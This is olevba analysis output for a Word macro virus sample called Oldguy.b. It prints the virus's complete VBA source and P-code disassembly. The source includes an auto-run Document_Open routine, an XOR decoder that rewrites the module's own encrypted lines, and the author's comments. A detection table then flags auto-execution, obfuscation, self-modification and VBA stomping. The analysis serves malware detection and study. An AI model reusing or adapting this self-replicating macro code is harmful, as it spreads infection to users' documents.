olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Oldguy.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Oldguy.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Ç™ýñãßdù£îñ3zêrðÇ™ýñãßdù
Private Sub Document_Open()
On Error Resume Next
¤éÄù¼ò = 153
For Éo¥»ßû = 11 To 28: ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine Éo¥»ßû, ªÎÞþÐí(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(Éo¥»ßû, 1), 2), ¤éÄù¼ò): Next: £îñ3zêrð
End Sub
Private Function ªÎÞþÐí(¢UøòçÞ, ¤éÄù¼ò)
For Éo¥»ßû = 1 To Len(¢UøòçÞ): ªÎÞþÐí = ªÎÞþÐí & Chr(Asc(Mid(¢UøòçÞ, Éo¥»ßû, 1)) Xor ¤éÄù¼ò): Next
End Function
Private Sub £îñ3zêrð()
'=p]`%k¹¤¹¨­©¹²¹Ð÷í±Ë÷ý¹³¹«ª°
'ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·ËüéõøúüÕð÷ü¹­µ¹»=p]`%k¹¤¹»¹¿¹=p]`%k
'ßöë¹Pö<"Fb¹¤¹¨¨¹Íö¹«¡
'ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·ËüéõøúüÕð÷ü¹Pö<"Fbµ¹Úñë±ª °¹¿¹3WGgIt±ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·Õð÷üê±Pö<"Fbµ¹¨°µ¹=p]`%k°
'×üáí
'Öéíðö÷ê·ÏðëìêÉëöíüúíðö÷¹¤¹ßøõêü£¹Öéíðö÷ê·Êøïü×öëôøõÉëöôéí¹¤¹ßøõêü
'Øééõðúøíðö÷·Ü÷øûõüÚø÷úüõÒüà¹¤¹îýÚø÷úüõÝðêøûõüý
'Øééõðúøíðö÷·ÝðêéõøàÊíøíìêÛøë¹¤¹ßøõêü
'ÍñðêÝöúìôü÷í·Êøïü
'Ðÿ¹ÔøúëöÚö÷íøð÷üë¹¤¹×öëôøõÍüôéõøíü¹Íñü÷¹Êüí¹j5D~êerC¹¤¹ØúíðïüÝöúìôü÷í¹Üõêü¹Êüí¹j5D~êerC¹¤¹×öëôøõÍüôéõøíü
'Êüí¹j5D~êe¹¤¹j5D~êerC·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü
'Ðÿ¹j5D~êe·Õð÷üê±¨µ¹¨°¹¥§¹»¾^
'j5D~êe·ýüõüíüõð÷üê¹¨µ¹j5D~êe·úöì÷íöÿõð÷üê
'j5D~êe·ð÷êüëíõð÷üê¹¨µ¹ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·Õð÷üê±¨µ¹ª«°
'Ðÿ¹j5D~êerC¹¤¹ØúíðïüÝöúìôü÷í¹Íñü÷¹ØúíðïüÝöúìôü÷í·Êøïü
'Ü÷ý¹Ðÿ
'Îðíñ¹Ýðøõöþê±îýÝðøõöþßðõüÊìôôøëàÐ÷ÿö°£¹·Íðíõü¹¤¹»ÑÚÝÊ¹øëü¹õ­ôª¹õªîã©ëê»£¹·Øìíñöë¹¤¹»üôø÷ìüõ¹þ©õýêíüð÷µ¹öõý¹þìà¹îðíñ¹÷üî¹÷øôü»£¹·Úöôôü÷íê¹¤¹»ýö¹àöì¹ò÷öî¹îñö¹ð¹øô¦»£¹·Üáüúìíü£¹Ü÷ý¹Îðíñ
'Ðÿ¹Ýøà±×öî°¹¤¹«ª¹Íñü÷¹Êüõüúíðö÷·ÍàéüÍüáí¹±»úõøêê·êøôéõü¹ûà¹üôø÷ìüõ¹þ©õýêíüð÷µ¹öõý¹þìà¹îðíñ¹÷üî¹÷øôü·»¹¿¹ïûÚë¹¿¹»ÑÚÝÊ¹øëü¹õ­ôª¹õªîã©ëê¸»°
End Sub
'Class.sample by emanuel g0ldstein
'Old guy with new name ;) Don't get me wrong!
'Do not spread this shit!

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Oldguy.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12006 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 "Ç™ýñãßdù£îñ3zêrðÇ™ýñãßdù"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0099 
' 	St ¤éÄù¼ò 
' Line #4:
' 	StartForVariable 
' 	Ld Éo¥»ßû 
' 	EndForVariable 
' 	LitDI2 0x000B 
' 	LitDI2 0x001C 
' 	For 
' 	BoS 0x0000 
' 	Ld Éo¥»ßû 
' 	Ld Éo¥»ßû 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	Ld ¤éÄù¼ò 
' 	ArgsLd ªÎÞþÐí 0x0002 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	ArgsCall £îñ3zêrð 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Function ªÎÞþÐí(¢UøòçÞ, ¤éÄù¼ò, id_FFFE As Variant))
' Line #7:
' 	StartForVariable 
' 	Ld Éo¥»ßû 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ¢UøòçÞ 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld ªÎÞþÐí 
' 	Ld ¢UøòçÞ 
' 	Ld Éo¥»ßû 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld ¤éÄù¼ò 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ªÎÞþÐí 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #8:
' 	EndFunc 
' Line #9:
' 	FuncDefn (Private Sub £îñ3zêrð())
' Line #10:
' 	QuoteRem 0x0000 0x001C "=p]`%k¹¤¹¨­©¹²¹Ð÷í±Ë÷ý¹³¹«ª°"
' Line #11:
' 	QuoteRem 0x0000 0x0055 "ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·ËüéõøúüÕð÷ü¹­µ¹»=p]`%k¹¤¹»¹¿¹=p]`%k"
' Line #12:
' 	QuoteRem 0x0000 0x0015 "ßöë¹Pö<"Fb¹¤¹¨¨¹Íö¹«¡"
' Line #13:
' 	QuoteRem 0x0000 0x00A2 "ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·ËüéõøúüÕð÷ü¹Pö<"Fbµ¹Úñë±ª °¹¿¹3WGgIt±ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·Õð÷üê±Pö<"Fbµ¹¨°µ¹=p]`%k°"
' Line #14:
' 	QuoteRem 0x0000 0x0004 "×üáí"
' Line #15:
' 	QuoteRem 0x0000 0x0041 "Öéíðö÷ê·ÏðëìêÉëöíüúíðö÷¹¤¹ßøõêü£¹Öéíðö÷ê·Êøïü×öëôøõÉëöôéí¹¤¹ßøõêü"
' Line #16:
' 	QuoteRem 0x0000 0x002E "Øééõðúøíðö÷·Ü÷øûõüÚø÷úüõÒüà¹¤¹îýÚø÷úüõÝðêøûõüý"
' Line #17:
' 	QuoteRem 0x0000 0x0024 "Øééõðúøíðö÷·ÝðêéõøàÊíøíìêÛøë¹¤¹ßøõêü"
' Line #18:
' 	QuoteRem 0x0000 0x0011 "ÍñðêÝöúìôü÷í·Êøïü"
' Line #19:
' 	QuoteRem 0x0000 0x0068 "Ðÿ¹ÔøúëöÚö÷íøð÷üë¹¤¹×öëôøõÍüôéõøíü¹Íñü÷¹Êüí¹j5D~êerC¹¤¹ØúíðïüÝöúìôü÷í¹Üõêü¹Êüí¹j5D~êerC¹¤¹×öëôøõÍüôéõøíü"
' Line #20:
' 	QuoteRem 0x0000 0x003A "Êüí¹j5D~êe¹¤¹j5D~êerC·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü"
' Line #21:
' 	QuoteRem 0x0000 0x001C "Ðÿ¹j5D~êe·Õð÷üê±¨µ¹¨°¹¥§¹»¾^"
' Line #22:
' 	QuoteRem 0x0000 0x0029 "j5D~êe·ýüõüíüõð÷üê¹¨µ¹j5D~êe·úöì÷íöÿõð÷üê"
' Line #23:
' 	QuoteRem 0x0000 0x0054 "j5D~êe·ð÷êüëíõð÷üê¹¨µ¹ÍñðêÝöúìôü÷í·ÏÛÉëöóüúí·ÏÛÚöôéö÷ü÷íê±¨°·ÚöýüÔöýìõü·Õð÷üê±¨µ¹ª«°"
' Line #24:
' 	QuoteRem 0x0000 0x0035 "Ðÿ¹j5D~êerC¹¤¹ØúíðïüÝöúìôü÷í¹Íñü÷¹ØúíðïüÝöúìôü÷í·Êøïü"
' Line #25:
' 	QuoteRem 0x0000 0x0006 "Ü÷ý¹Ðÿ"
' Line #26:
' 	QuoteRem 0x0000 0x00B6 "Îðíñ¹Ýðøõöþê±îýÝðøõöþßðõüÊìôôøëàÐ÷ÿö°£¹·Íðíõü¹¤¹»ÑÚÝÊ¹øëü¹õ­ôª¹õªîã©ëê»£¹·Øìíñöë¹¤¹»üôø÷ìüõ¹þ©õýêíüð÷µ¹öõý¹þìà¹îðíñ¹÷üî¹÷øôü»£¹·Úöôôü÷íê¹¤¹»ýö¹àöì¹ò÷öî¹îñö¹ð¹øô¦»£¹·Üáüúìíü£¹Ü÷ý¹Îðíñ"
' Line #27:
' 	QuoteRem 0x0000 0x0088 "Ðÿ¹Ýøà±×öî°¹¤¹«ª¹Íñü÷¹Êüõüúíðö÷·ÍàéüÍüáí¹±»úõøêê·êøôéõü¹ûà¹üôø÷ìüõ¹þ©õýêíüð÷µ¹öõý¹þìà¹îðíñ¹÷üî¹÷øôü·»¹¿¹ïûÚë¹¿¹»ÑÚÝÊ¹øëü¹õ­ôª¹õªîã©ëê¸»°"
' Line #28:
' 	EndSub 
' Line #29:
' 	QuoteRem 0x0000 0x0021 "Class.sample by emanuel g0ldstein"
' Line #30:
' 	QuoteRem 0x0000 0x002C "Old guy with new name ;) Don't get me wrong!"
' Line #31:
' 	QuoteRem 0x0000 0x0018 "Do not spread this shit!"
' Line #32:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

